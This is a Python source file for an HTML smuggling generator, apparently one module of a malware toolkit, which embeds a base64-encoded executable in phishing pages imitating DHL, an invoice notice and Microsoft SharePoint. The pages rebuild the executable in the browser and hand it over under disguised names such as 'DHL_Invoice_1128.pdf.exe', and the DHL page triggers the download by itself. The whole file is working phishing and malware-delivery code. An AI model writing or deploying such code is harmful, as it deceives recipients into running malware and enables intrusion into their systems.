"""
Delivery Specialist Module: HTML Smuggling
Developer: Lorn Thornpunleu (Puleu)
Purpose: Generate HTML files with embedded malware payloads

Project Spec: "HTML Smuggling: Embedding the EXE inside a JavaScript blob 
within an HTML file. When opened, the browser 'downloads' the malware locally."
"""

import base64
import os

class HTMLSmuggler:
    """Generate HTML smuggling payloads for malware delivery"""
    
    def __init__(self, payload_path="chimera.exe"):
        self.payload_path = payload_path
        self.output_dir = "example_payloads"
        
    def generate_html_smuggling(self, template="dhl", output_name=None):
        """
        Generate HTML smuggling payload
        
        Args:
            template: Phishing template to use ('dhl', 'invoice', 'office365')
            output_name: Custom output filename
        
        Returns:
            str: Path to generated HTML file
        """
        if not os.path.exists(self.payload_path):
            print(f"[!] Payload not found: {self.payload_path}")
            print("[!] Creating placeholder payload for testing...")
            # Create a harmless test payload
            os.makedirs(os.path.dirname(self.payload_path) or ".", exist_ok=True)
            with open(self.payload_path, "wb") as f:
                f.write(b"MZ_TEST_PAYLOAD_FOR_EDUCATIONAL_PURPOSES")

        with open(self.payload_path, "rb") as f:
            base64_payload = base64.b64encode(f.read()).decode('utf-8')

        # Select template
        if template == "dhl":
            html_content = self._get_dhl_template(base64_payload)
            default_name = "invoice_dhl_1128.html"
        elif template == "invoice":
            html_content = self._get_invoice_template(base64_payload)
            default_name = "Invoice_Payment.html"
        elif template == "office365":
            html_content = self._get_office365_template(base64_payload)
            default_name = "SharePoint_Document.html"
        else:
            html_content = self._get_dhl_template(base64_payload)
            default_name = "smuggled_payload.html"

        # Create output directory and file
        os.makedirs(self.output_dir, exist_ok=True)
        output_path = os.path.join(self.output_dir, output_name or default_name)
        
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(html_content)
        
        print(f"[+] HTML Smuggling payload created: {output_path}")
        return output_path
    
    def _get_dhl_template(self, base64_payload):
        """DHL phishing template"""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>DHL Express - Shipment Invoice #DH4839210</title>
<style>
    body {{margin:0;padding:0;background:#f4f4f4;font-family:Arial,sans-serif}}
    .container {{max-width:680px;margin:20px auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,0.1)}}
    .header {{background:#d40511;color:white;padding:20px;text-align:center}}
    .header img {{height:50px}}
    .content {{padding:30px}}
    .alert {{background:#fff8e1;border-left:5px solid #ff9800;padding:15px;margin:20px 0;font-weight:600}}
    .btn {{display:inline-block;background:#d40511;color:white;padding:14px 30px;text-decoration:none;border-radius:5px;font-weight:bold}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>DHL Express</h1>
    <h2>Shipment Invoice & Customs Documentation</h2>
  </div>
  <div class="content">
    <h2>Dear Valued Customer,</h2>
    <p>Your package <strong>#DH4839210</strong> requires a customs fee of <strong>USD 4.99</strong> before delivery.</p>
    <div class="alert">Action Required: Download invoice to proceed with payment.</div>
    <p style="text-align:center;">
      <a href="#" class="btn" id="dl">Download Invoice & Payment Form (PDF)</a>
    </p>
  </div>
</div>

<script>
var b64 = "{base64_payload}";
var bin = atob(b64);
var len = bin.length;
var arr = new Uint8Array(len);
for(var i=0;i<len;i++) arr[i] = bin.charCodeAt(i);
var blob = new Blob([arr], {{type:'octet/stream'}});
var url = URL.createObjectURL(blob);
document.getElementById('dl').href = url;
document.getElementById('dl').download = "DHL_Invoice_1128.pdf.exe";
// Auto-download after 2 seconds
setTimeout(function() {{ document.getElementById('dl').click(); }}, 2000);
</script>
</body>
</html>"""

    def _get_invoice_template(self, base64_payload):
        """Generic invoice phishing template"""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Invoice #INV-2025-4839 - Action Required</title>
<style>
    body {{margin:0;padding:20px;background:#f5f5f5;font-family:'Segoe UI',Arial,sans-serif}}
    .container {{max-width:600px;margin:0 auto;background:#fff;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}}
    .header {{background:#2c3e50;color:white;padding:25px;text-align:center}}
    .content {{padding:30px}}
    .invoice-box {{background:#f9f9f9;border:1px solid #ddd;padding:20px;margin:20px 0}}
    .btn {{display:inline-block;background:#27ae60;color:white;padding:15px 40px;text-decoration:none;border-radius:4px;font-weight:bold}}
    .warning {{color:#e74c3c;font-weight:bold}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>Invoice Notification</h1>
  </div>
  <div class="content">
    <p>Dear Customer,</p>
    <p>Please find attached your invoice for recent services.</p>
    <div class="invoice-box">
      <p><strong>Invoice Number:</strong> INV-2025-4839</p>
      <p><strong>Amount Due:</strong> $1,247.00</p>
      <p><strong>Due Date:</strong> December 20, 2025</p>
    </div>
    <p class="warning">⚠ Payment is required within 7 days to avoid late fees.</p>
    <p style="text-align:center;margin-top:30px">
      <a href="#" class="btn" id="dl">Download Invoice (PDF)</a>
    </p>
  </div>
</div>

<script>
var b64 = "{base64_payload}";
var bin = atob(b64);
var arr = new Uint8Array(bin.length);
for(var i=0;i<bin.length;i++) arr[i] = bin.charCodeAt(i);
var blob = new Blob([arr], {{type:'application/octet-stream'}});
document.getElementById('dl').href = URL.createObjectURL(blob);
document.getElementById('dl').download = "Invoice_INV-2025-4839.pdf.exe";
</script>
</body>
</html>"""

    def _get_office365_template(self, base64_payload):
        """Office 365 SharePoint phishing template"""
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>SharePoint - Shared Document</title>
<style>
    body {{margin:0;padding:0;background:#f3f2f1;font-family:'Segoe UI',sans-serif}}
    .container {{max-width:500px;margin:50px auto;background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,0.1)}}
    .header {{background:#0078d4;color:white;padding:15px 20px}}
    .content {{padding:30px}}
    .file-icon {{font-size:48px;text-align:center;margin:20px 0}}
    .btn {{display:block;background:#0078d4;color:white;padding:12px;text-decoration:none;border-radius:4px;text-align:center;font-weight:600}}
    .btn:hover {{background:#106ebe}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <strong>Microsoft SharePoint</strong>
  </div>
  <div class="content">
    <div class="file-icon">📄</div>
    <h2 style="text-align:center;margin:0">Quarterly_Report_Q4_2025.xlsx</h2>
    <p style="text-align:center;color:#666">John Smith shared a file with you</p>
    <p style="text-align:center;font-size:14px;color:#888">Click below to download</p>
    <a href="#" class="btn" id="dl">Download</a>
  </div>
</div>

<script>
var b64 = "{base64_payload}";
var bin = atob(b64);
var arr = new Uint8Array(bin.length);
for(var i=0;i<bin.length;i++) arr[i] = bin.charCodeAt(i);
var blob = new Blob([arr], {{type:'application/octet-stream'}});
document.getElementById('dl').href = URL.createObjectURL(blob);
document.getElementById('dl').download = "Quarterly_Report_Q4_2025.xlsx.exe";
</script>
</body>
</html>"""


def generate_html_smuggling(payload_path="chimera.exe", template="dhl"):
    """
    Generate HTML smuggling payload - entry point for integration
    
    Args:
        payload_path: Path to the malware executable
        template: Phishing template ('dhl', 'invoice', 'office365')
    
    Returns:
        str: Path to generated HTML file
    """
    smuggler = HTMLSmuggler(payload_path)
    return smuggler.generate_html_smuggling(template)


if __name__ == "__main__":
    print("🔴 HTML SMUGGLING GENERATOR - Delivery Specialist")
    print("=" * 50)
    print("Generates phishing HTML with embedded payload")
    print("=" * 50)
    
    # Interactive mode
    print("\nAvailable templates:")
    print("1. DHL Shipping Invoice")
    print("2. Generic Invoice")
    print("3. Office 365 SharePoint")
    
    choice = input("\nSelect template (1-3) [default: 1]: ").strip() or "1"
    
    templates = {"1": "dhl", "2": "invoice", "3": "office365"}
    template = templates.get(choice, "dhl")
    
    payload = input("Payload path [default: chimera.exe]: ").strip() or "chimera.exe"
    
    smuggler = HTMLSmuggler(payload)
    output_path = smuggler.generate_html_smuggling(template)
    
    print(f"\n✅ Generated: {output_path}")
    print("Open in a browser to test the download trigger")